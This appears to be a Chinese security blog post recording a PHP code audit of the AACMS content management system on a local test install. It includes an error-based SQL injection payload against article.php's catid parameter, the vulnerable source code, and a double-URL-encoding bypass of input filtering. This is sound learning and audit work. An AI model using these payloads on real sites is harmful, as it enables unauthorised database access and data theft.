@@ -1,0 +1,794 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="mechoy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言算是第一次审cms吧，参考学习了这位大哥的思路，故记录一下，emmm，菜鸡的我还不配自己去审，只能先找文章一边参考学习一边审。 审计过程环境PHP5.2.17 MySQL5.7.26 Apache2.4.39 程序安装先大致浏览下该cms的目录结构，三个入口函数，其他的基本上如图所描述的那样。  安装该cms，配置好网站之后直接访问&#x2F;install&#x2F;index.php即可，有个地方需要注意的是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计-AACMS">
+<meta property="og:url" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/index.html">
+<meta property="og:site_name" content="Mechoy&#39;s Blog">
+<meta property="og:description" content="前言算是第一次审cms吧，参考学习了这位大哥的思路，故记录一下，emmm，菜鸡的我还不配自己去审，只能先找文章一边参考学习一边审。 审计过程环境PHP5.2.17 MySQL5.7.26 Apache2.4.39 程序安装先大致浏览下该cms的目录结构，三个入口函数，其他的基本上如图所描述的那样。  安装该cms，配置好网站之后直接访问&#x2F;install&#x2F;index.php即可，有个地方需要注意的是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png">
+<meta property="og:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png">
+<meta property="article:published_time" content="2022-02-25T16:44:22.000Z">
+<meta property="article:modified_time" content="2022-05-14T16:19:30.186Z">
+<meta property="article:author" content="Mechoy">
+<meta property="article:tag" content="PHP代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png">
+  
+  
+  <title>代码审计-AACMS - Mechoy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Mechoy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="代码审计-AACMS"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        mechoy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-02-26 00:44" pubdate>
+          2022年2月26日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          100 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">代码审计-AACMS</h1>
+            
+            <div class="markdown-body">
+              
+              <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>算是第一次审cms吧，参考学习了这位大哥的思路，故记录一下，emmm，菜鸡的我还不配自己去审，只能先找文章一边参考学习一边审。</p>
+<h4 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>PHP5.2.17</p>
+<p>MySQL5.7.26</p>
+<p>Apache2.4.39</p>
+<h5 id="程序安装"><a href="#程序安装" class="headerlink" title="程序安装"></a>程序安装</h5><p>先大致浏览下该cms的目录结构，三个入口函数，其他的基本上如图所描述的那样。</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>安装该cms，配置好网站之后直接访问/install/index.php即可，有个地方需要注意的是：数据库默认字符集为GBK，这就可能导致存在宽字节注入</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h5><h6 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>先包含class_core.php，然后调用该文件中的两个方法，最后包含文章模板目录下的index文件</p>
+<p>跟进class_core.php文件查看，先是定义了一个常量，后定义了五个类，找到刚刚index.php中调用的方法</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> &amp; <span class="hljs-title">instance</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-comment">// 实例化了自己本身的对象：单例模式</span><br>		<span class="hljs-built_in">static</span> <span class="hljs-variable">$object</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$object</span>)) &#123;<br>			<span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> core();<br>		&#125;<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>再看<code>init()</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;	<span class="hljs-comment">// 调用该类中的一些其他方法</span><br>		<br>		<span class="hljs-keyword">$this</span>-&gt;_init_db();<br>		<span class="hljs-keyword">$this</span>-&gt;_init_memory();<br>		<span class="hljs-keyword">$this</span>-&gt;_init_session();		<span class="hljs-comment">// 初始化session</span><br>		<span class="hljs-keyword">$this</span>-&gt;_init_setting();		<span class="hljs-comment">//</span><br>		<span class="hljs-keyword">$this</span>-&gt;_init_misc();		<span class="hljs-comment">//初始化时区</span><br>	<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_db</span>(<span class="hljs-params"></span>) </span>&#123;	<span class="hljs-comment">// 创建数据库连接</span><br>		<span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br>		<br>		<span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql&#x27;</span>;<br>		<span class="hljs-keyword">if</span>(count(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;slave&#x27;</span>])) &#123;		<span class="hljs-comment">// config中根本没有该内容，所以无法进入</span><br>			<span class="hljs-keyword">require_once</span> libfile(<span class="hljs-string">&#x27;class/mysql_slave&#x27;</span>);<br>			<span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql_slave&#x27;</span>;<br>		&#125;<br>		<span class="hljs-keyword">$this</span>-&gt;db = &amp; DB::object(<span class="hljs-variable">$class</span>);<br>		<span class="hljs-keyword">$this</span>-&gt;db-&gt;set_config(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>]);<br>		<span class="hljs-keyword">$this</span>-&gt;db-&gt;connect();<br>		<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里引入了$_G这个全局变量，并且根据该全局变量的值进行了一个判断，而PHP中并没有给出这个全局变量，并且在前面也没有对该变量的值进行一个定义操作，所以，需要寻找一下该全局变量是从哪里来的。</p>
+<p>PHP在实例化类时，会调用构造方法，而构造方法分两种，一种是__construct 魔术方法；另一种是将成员方法定义为类名。这里没有使用魔术方法，所以肯定是直接使用的与类名相同的成员方法，找到该方法，跟进并简答分析每一个方法的作用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">core</span>(<span class="hljs-params"></span>) </span>&#123;		<span class="hljs-comment">// 看名字都知道是一堆初始化</span><br>		<span class="hljs-keyword">$this</span>-&gt;_init_env();		<span class="hljs-comment">// 屏蔽错误信息、设置session、设置XXF头，对$_G进行一定的赋值</span><br>		<span class="hljs-keyword">$this</span>-&gt;_init_config();	<span class="hljs-comment">// 将配置文件全部写入到$_G中</span><br>		<span class="hljs-keyword">$this</span>-&gt;_init_input();	<span class="hljs-comment">// 将GET\POST\COOKIE\FILE等输入全部进行魔术引号过滤</span><br>		<span class="hljs-keyword">$this</span>-&gt;_init_output();	<span class="hljs-comment">// 定义OB缓冲机制，即返回包相关内容</span><br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>回到<code>init()</code>方法中调用的<code>__init_db()</code>方法，跟进，确定该方法是用来建立数据库链接，/config/config_global.php中读取相关配置信息，然后进行简历数据库链接</p>
+<p>跟进<code>_init_memory()</code>方法，发现是初始化memory</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_memory</span>(<span class="hljs-params"></span>) </span>&#123;		<span class="hljs-comment">// 初始化memory</span><br>		<span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br>		<br>		<span class="hljs-keyword">$this</span>-&gt;mem = <span class="hljs-keyword">new</span> memory();	<span class="hljs-comment">// 实例化memory类</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;init_memory) &#123;<br>			<span class="hljs-keyword">$this</span>-&gt;mem-&gt;init(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;memory&#x27;</span>]);<br>		&#125;<br>		<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;memory&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;mem-&gt;type;<br>	<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>后面的也都是一些初始化操作，所以回到index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;index&#x27;</span>);		<br></code></pre></td></tr></table></figure>
+
+<p>跟进<code>template()</code>,其实就是将数据库中的文章显示在index.php中</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>index.php分析完了，结果是没有任何发现，但对该CMS有了一定的了解。继续分析其他的入口函数</p>
+<h6 id="article-php"><a href="#article-php" class="headerlink" title="article.php"></a>article.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟随大哥的思路，看一下article_view.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;IN_AACMS&#x27;</span>)) &#123;	<span class="hljs-comment">// 该值前面定义过，为True</span><br>	<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Access Denied&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$aid</span> = intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]);	<span class="hljs-comment">// 获取aid</span><br><span class="hljs-variable">$article</span> = DB::getRow(<span class="hljs-string">&#x27;SELECT * FROM &#x27;</span>.DB::table(<span class="hljs-string">&#x27;article&#x27;</span>).<span class="hljs-string">&quot; WHERE aid=&#x27;<span class="hljs-subst">$aid</span>&#x27;&quot;</span>);	<span class="hljs-comment">// 根据aid返回文章</span><br><br><br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;article/view&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>在数据库中插入一条记录，因为该表中的所有字段都不能为null，所以只能所有的都添加上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (1, 1, &#x27;aacms 代码审计&#x27;, 1, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, &#x27;代码审计&#x27;, &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure>
+
+<p>在浏览器中进行访问</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>从这里开看，如果在插入title和content时内容可控，则可能存在二次注入；比如执行如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (2, 2,database(), 2, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, user(), &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>回到article.php，这里接收了一个aid，但是aid经过<code>intval()</code>的处理了，而<code>intval()</code>函数的返回变量 <code>var</code> 的 [integer]数值，所以导致无法实现注入；</p>
+<h6 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>在没有登陆的状态下，默认是进入到admin_member.php中，并且根据operation的值跳入到指定模块中去</p>
+<p>到这里，三个入口函数基本了解清楚，由于index.php和article.php没有什么内容，所以只能从admin.php处下手进行审计。</p>
+<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="发现的漏洞"><a href="#发现的漏洞" class="headerlink" title="发现的漏洞"></a>发现的漏洞</h5><h6 id="1-前台SQL注入"><a href="#1-前台SQL注入" class="headerlink" title="1.前台SQL注入"></a>1.前台SQL注入</h6><p>这里需要先在后台文章处添加一个栏目</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后再访问<a target="_blank" rel="noopener" href="http://127.0.0.1/aacms28/article.php%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0">http://127.0.0.1/aacms28/article.php就能看到</a></p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>给<code>catid</code>参数加个单引号,页面爆出数据库错误</p>
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)--%20  //页面返回正常</span><br></code></pre></td></tr></table></figure>
+
+<p>由此可以构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里由于是黑盒测试的，所以需要去回去看一下源码，看一下源码该漏洞是如何形成的，可以根据报错信息去寻找漏洞点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 漏洞位置位于/aacms/source/function/block/block.article.php 25-40行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]) &#123; 	<span class="hljs-comment">// 传入catid,没有aid，所以直接进入else</span><br>		<span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;aid IN (&#x27;</span>.<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>].<span class="hljs-string">&#x27;)&#x27;</span>;<br>	&#125;  <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-variable">$catid</span> = <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : <span class="hljs-string">&#x27;0&#x27;</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$catid</span>) &#123;<br>			<span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;catid IN (&#x27;</span>.<span class="hljs-variable">$catid</span>.<span class="hljs-string">&#x27;)&#x27;</span>;	<span class="hljs-comment">// 采用直接拼接</span><br>		&#125;<br>	&#125;	<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$wherearr</span>) &#123;<br>		<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = implode(<span class="hljs-string">&#x27; AND &#x27;</span>, <span class="hljs-variable">$wherearr</span>);    <span class="hljs-comment">// 返回一个由数据元素组合成的字符串</span><br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = <span class="hljs-string">&#x27; 1 &#x27;</span>;<br>	&#125;	<br>    <span class="hljs-comment"># SELECT COUNT(*) FROM pre_article_index WHERE catid IN (1)</span><br>	<span class="hljs-variable">$count</span> = DB::getOne(<span class="hljs-string">&quot;SELECT COUNT(*) FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;article_index&#x27;</span>).<span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>此处是因为对<code>$catid</code>直接拼接，并且该变量没有单引号进行保护</p>
+<h5 id="复现的漏洞"><a href="#复现的漏洞" class="headerlink" title="复现的漏洞"></a>复现的漏洞</h5><h6 id="1-urldecode导致的注入漏洞"><a href="#1-urldecode导致的注入漏洞" class="headerlink" title="1.urldecode导致的注入漏洞"></a>1.<strong>urldecode导致的注入漏洞</strong></h6><p>漏洞位置 <code>\admin\admin_misc.php</code></p>
+<p>这个漏洞产生的原因在于程序对于接受的GET参数再次进行了url解码，因为浏览器在向web应用发送参数时是已经进行了一次url解码，然后经过<code>daddslashes()</code>过滤，但程序内部再一次进行了url解码，就导致可以采用两次url编码来绕过<code>daddslashes()</code>，从而实现注入</p>
